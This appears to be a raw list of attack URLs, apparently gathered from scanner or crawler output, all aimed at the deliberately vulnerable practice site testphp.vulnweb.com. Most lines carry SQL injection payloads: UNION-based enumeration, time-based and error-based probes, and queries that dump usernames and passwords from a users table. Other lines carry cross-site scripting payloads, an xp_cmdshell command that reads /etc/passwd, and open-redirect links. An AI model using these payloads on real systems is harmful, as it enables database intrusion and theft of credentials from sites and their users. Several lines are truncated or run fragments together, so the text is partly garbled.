http://testphp.vulnweb.com/?%3Fid=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20WElj
http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%29%29%20AND%205413%3D5413%23
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20SLEEP%285%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/?%3Fid=1%29%20ORDER%20BY%201--%20HniO
http://testphp.vulnweb.com/listproducts.php?cat=-1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27pHbDuC%3C%27%22%3EyQLWoa
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,group_concat(table_name),3,4,5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+
http://testphp.vulnweb.com/listproducts.php?id=1%29%22%2C%28%27%2C%28%2C%29.
http://testphp.vulnweb.com/listproducts.php?cat=-20%20UNION%20SELECT%2011,%201,%202,%203,%204,%205,%20COLUMN_NAME,%207,%208,%209,%2010%20FROM%20INFORMATION_SCHEMA.COLUM
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202669%3DBENCHMARK%285000000%2CMD5%280x4a62416c%29%29
http://testphp.vulnweb.com/index.php?id=%252%25%28%27.%28.%28%29%2C%28%22&user=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%203090%3D2235%20AND%20%285770%3D5770
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%208596%3D7802--%20PbPi
http://testphp.vulnweb.com:80/comment.php?pid=2
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%202688%3D2688%20AND%20%27IPvk%27%3D%27IPvk
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%205413%3D5413%23
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20%28SELECT%202556%20FROM%20%28SELECT%28SLEEP%285%29%29%29YKBO%29%23
http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27,database(),%27vul
http://testphp.vulnweb.com:80/comment.php?pid=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20%28SELECT%207571%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178706a71%2C%28SELECT%20%28ELT%287571%3D7571%2C1%29%29%29%2C0x71706b6a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20hpUy
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%202017%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28111%29%7C%7CCHR%2865%29%7C%7CCHR%2884%29%2C5%29%20AND%20%281321%3D1321
http://testphp.vulnweb.com:80/comment.php?aid=2
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(SELECT+1+from+user+limit+0,1
http://testphp.vulnweb.com/listproducts.php?cat=13DatabaseManipulationsSQL
http://testphp.vulnweb.com/listproducts.php?artist=FUZZ&cat=FUZZ%27
http://testphp.vulnweb.com/listproducts.php?cat=-1%E2%80%99%EF%80%A0%EF%80%A0%EF%80%A0
http://testphp.vulnweb.com/?%3Fid=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%207691%3D2728%20AND%20%288445%3D8445&user=2
http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=4
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%205301%3D3094%20AND%20%286102%3D6102
http://testphp.vulnweb.com/listproducts.php?cat=1+union+all+select+1,2,3,4,5,6,7,8,9,10,11
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%204264%3DBENCHMARK%285000000%2CMD5%280x6f7a5776%29%29%23
http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(uname,0x3a,pass)+from+acuart.users+--
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20XNxB&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%204229%3D3436
http://testphp.vulnweb.com/listproducts.php?cat=13
http://testphp.vulnweb.com/listproducts.php?cat=1%20and%201=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20SLEEP%285%29%23
http://testphp.vulnweb.com/?%3Fid=1%27%29%3BSELECT%20PG_SLEEP%285%29--
http://testphp.vulnweb.com/listproducts.php?cat=-1+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Ctable_name%2C8%2C9%2C10%2C11+FROM+information_schema.tables
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+null,null
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11
http://testphp.vulnweb.com/index.php?id=%252%25%20AND%204678%3D3657&user=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%202289%3DBENCHMARK%285000000%2CMD5%280x626b6e43%29%29%23
http://testphp.vulnweb.com/index.php?id=%252%25%27%29%20AND%203613%3D3613%20AND%20%28%27MHif%27%3D%27MHif&user=1
http://testphp.vulnweb.com/listproducts.php?cat=1%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20GTID_SUBSET%28CONCAT%280x7176716271%2C%28SELECT%20%28ELT%285076%3D5076%2C1%29%29%29%2C0x716b786b71%29%2C5076%29
http://testphp.vulnweb.com/?%3Fid=1%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27HvGn%27%3D%27HvGn
http://testphp.vulnweb.com/index.php?%25id%25=1%20AND%205392%3D8467&user=2
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8
http://testphp.vulnweb.com/listproducts.php?cat=-1+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Ccolumn_name%2C8%2C9%2C10%2C11+FROM+information_schema.columns+WHERE+table_name+%3D+%27users
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%203;
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12.http://www.try2hack.nl/13.http://vicnum.ciphertechs.com/14.http://webappsecmovies.sourceforge.net/webgoat/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20GTID_SUBSET%28CONCAT%280x7178706a71%2C%28SELECT%20%28ELT%286160%3D6160%2C1%29%29%29%2C0x71706b6a71%29%2C6160%29--%20LTYw
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20CHR%2883%29%7C%7CCHR%2868%29%7C%7CCHR%28121%29%7C%7CCHR%28116%29%29%3D%27VFku%27%20AND%20%287427%3D7427&user=2
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201;
http://testphp.vulnweb.com/index.php?%25id%25=1%27mvGJfV%3C%27%22%3EzuDzIM&user=2
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20UNION%20ALL%20SELECT%20NULL--%20bQXz&user=2
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%202688%3D2688%20AND%20%28%27YdJP%27%3D%27YdJP
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%201456%3DBENCHMARK%285000000%2CMD5%280x4e786349%29%29--%20ncfq
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a767071%2C%28SELECT%20%28ELT%285742%3D5742%2C1%29%29%29%2C0x7178627a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20Kial
http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22
http://testphp.vulnweb.com/index.php?id=%252%25%29%20AND%201741%3D4802%20AND%20%286375%3D6375&user=1
http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%201--%20-
http://testphp.vulnweb.com/listproducts.php?cat=1+ORDER+BY+1%2C2%2C3
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,table_name+from+information_schema.tables
http://testphp.vulnweb.com/listproducts.php?cat=1+and+SELECT+1+from+admins+limit+0,1
http://testphp.vulnweb.com/listproducts.php?artist=FUZZ&asdf=FUZZ&cat=FUZZ%27
http://testphp.vulnweb.com/listproducts.php?cat=13Database
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Enetsparker(0x002752)%3C%2fscRipt%3E
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176716271%2C%28SELECT%20%28ELT%288169%3D8169%2C1%29%29%29%2C0x716b786b71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%207431%3D6247%20AND%20%282972%3D2972
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%206311%3D6311
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20CVAR%28NULL%29%20FROM%20MSysAccessObjects%29%20IS%20NULL%20AND%20%283978%3D3978&user=2
http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123DalFox
http://testphp.vulnweb.com/listproducts.php?cat=1+and+1%3D0
http://testphp.vulnweb.com/?%3Fid=1%20AND%208524%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288524%3D8524%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--%20MMSw
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=10
http://testphp.vulnweb.com/listproducts.php?cat=-20%20UNION%20SELECT%2011,%20uname,%202,%203,%204,%205,%20pass,%207,%208,%209,%2010%20FROM%20users
http://testphp.vulnweb.com/AJAX/infoartist.php?id=9023
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(column_name)+from+information_schema
http://testphp.vulnweb.com/index.php?%25id%25=1%20AND%209110%3D6018&user=2
http://testphp.vulnweb.com/comment.php?aid=1+1
http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,database()+--
http://testphp.vulnweb.com/login.php?id=1%27%29%20AND%206038%3D6038%20AND%20%28%27dpXP%27%3D%27dpXP
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%20
http://testphp.vulnweb.com/?%3Fid=1%27%20ORDER%20BY%209208--%20mAUw
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%204786%3D%28SELECT%204786%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27tweF%27%3D%27tweF
http://testphp.vulnweb.com/listproducts.php?cat=-900990909%20UNION%20SELECT%201,2,3,4,5,6,table_name,8,9,10,11%20FROM%20information_schema.tables%20where%20table_schema%20=%20database();;
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%204201%3D9645%20AND%20%287157%3D7157
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Enetsparker(0x105C3E
http://testphp.vulnweb.com/?%3Fid=1%20AND%202688%3D2688--%20rlId
http://testphp.vulnweb.com/listproducts.php?cat=-900990909%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11%20FROM%20information_schema.tables%20where%20table_schema%20=%20database();;
http://testphp.vulnweb.com/listproducts.php?cat=1
http://testphp.vulnweb.com/redir.php?r=https://pl.grepolis.com/start/redirect?url=https://numberfields.asu.edu/NumberFields/show_user.php?userid=1078502
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11;
http://testphp.vulnweb.com/?%3Fid=1%29%20ORDER%20BY%206747--%20zbER
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20CONCAT%280x7178706a71%2C0x50776454564d694951416d4b6d7075657a70507451485048487867707574556150454c776b764c6b%2C0x71706b6a71%29%2C57--%20-
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12.http://www.try2hack.nl/13.http://vicnum.ciphertechs.com/14
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/?%3Fid=1%20AND%20EXTRACTVALUE%281877%2CCONCAT%280x5c%2C0x716a717671%2C%28SELECT%20%28ELT%281877%3D1877%2C1%29%29%29%2C0x7178767171%29%29
http://testphp.vulnweb.com/listproducts.php?artist=6984&cat=1493
http://testphp.vulnweb.com/?%3Fid=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%209487%3D9513%20AND%20%285486%3D5486
http://testphp.vulnweb.com:80/listproducts.php?cat=2'
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%205667%3DBENCHMARK%285000000%2CMD5%280x6e524554%29%29--%20YRTY
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a767071%2C%28SELECT%20%28ELT%286956%3D6956%2C1%29%29%29%2C0x7178627a71%2C0x78%29%29x%29%29--%20GcxS
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176716271%2C%28SELECT%20%28ELT%286538%3D6538%2C1%29%29%29%2C0x716b786b71%2C0x78%29%29x%29%29
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%20%28SELECT%204334%20FROM%20%28SELECT%28SLEEP%285%29%29%29BbTj%29%20AND%20%287044%3D7044
http://testphp.vulnweb.com/index.php?id=%252%25&user=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20SLEEP%285%29--%20DLUW
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%208524%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288524%3D8524%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%286222%3D6222
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5
http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27
http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27,@@version,%27vuln3%27,%27vuln4%27,%27vuln5%27,%27vuln6%27,%27vuln7%27,%27vuln8%27,%27vuln9%27,%27vuln10%27,%27vuln11%27
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1.%29%27%28%28%28%22.%2C.
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20SLEEP%285%29--%20jlcm
http://testphp.vulnweb.com/index.php?%25id%25=8126&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%201991%3D3459
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Ealert(0x105C3E)%3C%2fscRipt%3E
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202145%3DBENCHMARK%285000000%2CMD5%280x624e656c%29%29%23
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,11--
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%2057%2CCONCAT%280x7178706a71%2C0x6b49584458565a64467463566d724642596b48724169737347755a626e6361487447716655596246%2C0x71706b6a71%29--%20-
http://testphp.vulnweb.com/listproducts.php?cat=1%EF%80%A0%3Cspan
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20UPDATEXML%288880%2CCONCAT%280x2e%2C0x7178706a71%2C%28SELECT%20%28ELT%288880%3D8880%2C1%29%29%29%2C0x71706b6a71%29%2C3612%29--%20lLkG
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%201253%3D1253%20AND%20%284461%3D4461&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%208829%3D8829--%20PFhx
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(table_name)+from+information_schema.tables
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20CONCAT%280x7178706a71%2C0x704f697453666e784964687876764a6c6c457150444f58456b63677949636a6147504e6964654154%2C0x71706b6a71%29%2CNULL--%20-
http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%2017-7%3d10
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%208524%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288524%3D8524%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%28%27bLMB%27%3D%27bLMB
http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%201=1%20UNION%20ALL%20SELECT%201,table_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables--%20-
http://testphp.vulnweb.com/listproducts.php?cat=1+and+subs
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,group_concat(colu
http://testphp.vulnweb.com/redir.php?r=http://krovlya.dp.ua/index.php?subaction=userinfo&user=evykoby
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20ROW%289777%2C8926%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176716271%2C%28SELECT%20%28ELT%289777%3D9777%2C1%29%29%29%2C0x716b786b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%203911%20UNION%20SELECT%202804%20UNION%20SELECT%206270%20UNION%20SELECT%206446%29a%20GROUP%20BY%20x%29
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%201263%3D3403%20AND%20%27eAkm%27%3D%27eAkm
http://testphp.vulnweb.com/listproducts.php?cat=%27+and+select+%27a%27--
http://testphp.vulnweb.com/login.php?id=1
http://testphp.vulnweb.com:80/comment.php?pid=4
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%288201%2CCONCAT%280x5c%2C0x7178706a71%2C%28SELECT%20%28CASE%20WHEN%20%288201%3D8201%29%20THEN%201%20ELSE%200%20END%29%29%2C0x71706b6a71%29%29%2C1%29--%20Ofsd
http://testphp.vulnweb.com/listproducts.php?cat=1--dbs
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%20%28SELECT%204334%20FROM%20%28SELECT%28SLEEP%285%29%29%29BbTj%29%20AND%20%27OWEu%27%3D%27OWEu
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7162787a71%2C%28SELECT%20%28ELT%288544%3D8544%2C1%29%29%29%2C0x716b7a6271%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20psTN
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29%20AND%206865%3D4339%20AND%20%28%27UomA%27%3D%27UomA
http://testphp.vulnweb.com/listproducts.php?cat=1A01
http://testphp.vulnweb.com/redir.php?r=http://mist-cccp.com/users.php?m=details&id=24157
http://testphp.vulnweb.com/listproducts.php?cat=-1+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C%40%40version%2C8%2C9%2C10%2C11
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/index.php?%25id%25=%28SELECT%20CONCAT%28CONCAT%28%27qqpxq%27%2C%28CASE%20WHEN%20%287911%3D7911%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qvxvq%27%29%29&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7178706a71%2C%28SELECT%20%28ELT%289312%3D9312%2C1%29%29%29%2C0x71706b6a71%29%29%20USING%20utf8%29%29%29--%20WagD
http://testphp.vulnweb.com/listproducts.php?cat=1%EF%80%A0%27&gt=
http://testphp.vulnweb.com/?%3Fid=1%3BSELECT%20PG_SLEEP%285%29--
http://testphp.vulnweb.com/comment.php?aid=1%20OR%201==1
http://testphp.vulnweb.com:80/listproducts.php?cat=1%E2%80%9D
http://testphp.vulnweb.com/comment.php?pid=3A01
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL--%20-
http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(r
http://testphp.vulnweb.com/listproducts.php?cat=1%27%20UNION%20SELECT%201,2,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--%20-
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%201315%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281315%3D1315%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285540%3D5540
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%201315%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281315%3D1315%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27KWVq%27%3D%27KWVq
http://testphp.vulnweb.com/index.php?id=%252%25%20AND%204515%3D7565&user=1
http://testphp.vulnweb.com/listproducts.php?cat=140
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+%27a%27+from+dual--
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20ORDER%20BY%201--%20jDqK&user=2
http://testphp.vulnweb.com/listproducts.php?cat=1%EF%80%A0
http://testphp.vulnweb.com/listproducts.php?cat=1%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E
http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/
http://testphp.vulnweb.com/?%3Fid=1%20AND%20%28SELECT%204334%20FROM%20%28SELECT%28SLEEP%285%29%29%29BbTj%29--%20dRUU
http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,2,3,4,5,6,7,8,9,10,11--
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%206602%3D8784%20AND%20%28%27awZN%27%3D%27awZN
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%202--%20-
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20halfMD5%28NULL%29%20IS%20NULL%29%20IS%20NULL%20AND%20%288353%3D8353&user=2
http://testphp.vulnweb.com/listproducts.php?cat=extractvalue
http://testphp.vulnweb.com/listproducts.php?cat=-900990909%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11%20FROM%20information_schema.tables;
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%201797%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281797%3D1797%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27YAkB%27%3D%27YAkB
http://testphp.vulnweb.com/listproducts.php?cat=%22%20or%201=1--
